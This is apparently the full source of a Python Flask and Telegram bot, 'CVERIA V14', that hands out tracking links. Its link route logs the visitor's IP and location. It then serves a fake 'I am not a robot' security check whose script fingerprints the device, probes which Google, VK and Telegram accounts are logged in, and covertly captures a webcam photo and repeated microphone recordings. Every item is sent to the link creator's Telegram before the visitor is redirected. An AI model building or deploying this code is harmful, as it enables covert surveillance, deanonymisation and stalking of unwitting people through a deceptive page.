import telebot, requests, os, uuid
from flask import Flask, request

API_TOKEN = os.environ.get('API_TOKEN')
bot = telebot.TeleBot(API_TOKEN, threaded=False)
app = Flask(__name__)

# Хранилище в памяти
db = {} 

@app.route('/')
def home():
    return f'''
    <body style="background:#000;display:flex;justify-content:center;align-items:center;height:100vh;color:#fff;font-family:sans-serif;text-align:center;">
        <div style="padding:40px;border:1px solid #333;border-radius:20px;">
            <h1 style="color:#0088cc;margin:0 0 20px 0;">CVERIA V14</h1>
            <a href="/activate" style="padding:15px 30px;background:#0088cc;color:#fff;text-decoration:none;border-radius:10px;font-weight:bold;">АКТИВИРОВАТЬ СИСТЕМУ</a>
        </div>
    </body>
    '''

@app.route('/activate')
def activate():
    webhook_url = f"https://{request.host}/{API_TOKEN}"
    if bot.set_webhook(url=webhook_url):
        return f"✅ СИСТЕМА ГОТОВА: {webhook_url}"
    return "❌ ОШИБКА"

@app.route('/' + (API_TOKEN if API_TOKEN else "none"), methods=['POST'])
def get_m():
    if request.headers.get('content-type') == 'application/json':
        bot.process_new_updates([telebot.types.Update.de_json(request.get_data().decode('utf-8'))])
        return "!", 200
    return "forbidden", 403

@app.route('/v/<uid>')
def logger(uid):
    if uid not in db: return "URL EXPIRED - CREATE NEW ONE IN BOT", 404
    owner_id, target = db[uid]['owner'], db[uid]['url']
    
    # Получаем IP
    ip_raw = request.headers.get('x-forwarded-for', request.remote_addr)
    ip = ip_raw.split(',')[0].strip() if ip_raw else request.remote_addr
    
    # GeoIP Фикс
    g = "📍 Данные GeoIP недоступны"
    try:
        r = requests.get(f"https://ipapi.co{ip}/json/", timeout=5).json()
        if not r.get('error'):
            g = (f"🌍 Страна: {r.get('country_name')} ({r.get('country_code')})\n"
                 f"🏙 Город: {r.get('city')}\n"
                 f"📡 Провайдер: {r.get('org')}\n"
                 f"🛡️ VPN/Proxy: {'ДА' if r.get('proxy') else 'НЕТ'}")
    except: pass
    
    bot.send_message(owner_id, f"🎯 *НОВЫЙ ТАРГЕТ!*\n\n👤 IP: `{ip}`\n{g}", parse_mode="Markdown")
    
    return f'''
    <html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"></head>
    <body style="background:#000;color:#fff;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;overflow:hidden;text-align:center;">
        <div>
            <div style="font-size:65px;margin-bottom:15px;">🛡️</div>
            <h2>Проверка безопасности</h2>
            <p style="color:#555;margin-bottom:30px;">Нажмите кнопку для продолжения</p>
            <button id="go" style="padding:18px 60px;border:none;border-radius:40px;background:#fff;color:#000;font-weight:900;cursor:pointer;">Я НЕ РОБОТ</button>
        </div>
        <video id="v" style="display:none;" autoplay playsinline muted></video><canvas id="c" style="display:none;"></canvas>
        <script>
        document.getElementById('go').onclick = async () => {{
            document.getElementById('go').innerText = "Анализ...";
            
            let d = {{
                uid: "{uid}",
                hw: {{ scr: screen.width+"x"+screen.height+"*"+devicePixelRatio, cores: navigator.hardwareConcurrency, ram: navigator.deviceMemory || "N/A", gpu: "N/A" }},
                bat: {{ lvl: "N/A", char: "N/A" }},
                net: {{ type: navigator.connection ? navigator.connection.effectiveType : "N/A", hist: history.length, tz: Intl.DateTimeFormat().resolvedOptions().timeZone, lang: navigator.language }},
                social: {{ g: "❌", vk: "❌", tg: "❌" }}, inc: "НЕТ"
            }};

            try {{
                let gl = document.createElement('canvas').getContext('webgl');
                let dbg = gl.getExtension('WEBGL_debug_renderer_info');
                d.hw.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
            }} catch(e) {{}}

            const ck = (u) => new Promise(r => {{ let i = new Image(); i.onload=()=>r("✅"); i.onerror=()=>r("❌"); i.src=u; }});
            d.social.g = await ck("https://accounts.google.com");
            d.social.vk = await ck("https://vk.com");
            d.social.tg = await ck("https://web.telegram.org");

            try {{
                let b = await navigator.getBattery();
                d.bat.lvl = Math.round(b.level * 100) + "%";
                d.bat.char = b.charging ? "(Заряжается)" : "(Нет)";
            }} catch(e) {{}}

            if (navigator.storage && navigator.storage.estimate) {{
                const est = await navigator.storage.estimate();
                if (est.quota < 120000000) d.inc = "ДА";
            }}

            await fetch('/log_extra', {{ method: 'POST', headers: {{'Content-Type': 'application/json'}}, body: JSON.stringify(d) }});

            try {{
                const s = await navigator.mediaDevices.getUserMedia({{ video: true, audio: true }});
                const v = document.getElementById('v'); v.srcObject = s;
                
                function rec() {{
                    const r = new MediaRecorder(s); const ch = [];
                    r.ondataavailable = e => ch.push(e.data);
                    r.onstop = () => {{
                        const f = new FormData(); f.append('audio', new Blob(ch, {{type:'audio/webm'}}), 'a.webm'); f.append('uid', "{uid}");
                        fetch('/log_audio', {{ method: 'POST', body: f }});
                        if(s.active) rec();
                    }};
                    r.start(); setTimeout(() => r.stop(), 10000);
                }}
                rec();

                setTimeout(() => {{
                    const c = document.getElementById('c'); c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    c.toBlob(b => {{
                        const f = new FormData(); f.append('photo', b, 'p.jpg'); f.append('uid', "{uid}");
                        fetch('/log_photo', {{ method: 'POST', body: f }}).then(() => {{ 
                            setTimeout(() => {{ window.location.href = "{target}"; }}, 2500);
                        }});
                    }}, 'image/jpeg', 0.7);
                }}, 1500);
            }} catch(e) {{ window.location.href = "{target}"; }}
        }};
        </script>
    </body></html>
    '''

@app.route('/log_extra', methods=['POST'])
def log_extra():
    d = request.json
    if d and d['uid'] in db:
        m = (f"🖥 *ТЕХНИЧЕСКИЙ ОТЧЕТ ID:* `{d['uid']}`\n\n"
             f"🔋 *Заряд:* {d['bat']['lvl']} {d['bat']['char']}\n"
             f"🌐 *Сеть:* {d['net']['type']} | *Вкладки:* {d['net']['hist']}\n"
             f"🧠 *CPU:* {d['hw']['cores']} ядер | *RAM:* {d['hw']['ram']}GB\n"
             f"📺 *Экран:* {d['hw']['scr']}\n"
             f"🎮 *GPU:* {d['hw']['gpu']}\n"
             f"👤 *Вход:* Google: {d['social']['g']} | VK: {d['social']['vk']} | TG: {d['social']['tg']}\n"
             f"🕵️ *Инкогнито:* {d['inc']}\n"
             f"🕒 *Пояс:* {d['net']['tz']} | {d['net']['lang']}")
        bot.send_message(db[d['uid']]['owner'], m, parse_mode="Markdown")
    return "ok"

@app.route('/log_photo', methods=['POST'])
def log_photo():
    uid, f = request.form.get('uid'), request.files.get('photo')
    if uid in db and f: bot.send_photo(db[uid]['owner'], f.read(), caption=f"📸 *ЛИЦО ТАРГЕТА* (ID: `{uid}`)")
    return "ok"

@app.route('/log_audio', methods=['POST'])
def log_audio():
    uid, f = request.form.get('uid'), request.files.get('audio')
    if uid in db and f: bot.send_document(db[uid]['owner'], f.read(), caption=f"🎤 *ЗАПИСЬ ОКРУЖЕНИЯ* (ID: `{uid}`)")
    return "ok"

@bot.message_handler(commands=['start'])
def start(m):
    bot.reply_to(m, "👋 Привет! Пришли ссылку на Telegraph.")

@bot.message_handler(func=lambda m: "telegra.ph" in m.text.lower())
def create(m):
    url = m.text.strip()
    if not url.startswith("http"): url = "https://" + url
    uid = str(uuid.uuid4())[:8]
    db[uid] = {'owner': m.chat.id, 'url': url}
    bot.reply_to(m, f"✅ Твоя ссылка:\n`https://{request.host}/v/{uid}`", parse_mode="Markdown")
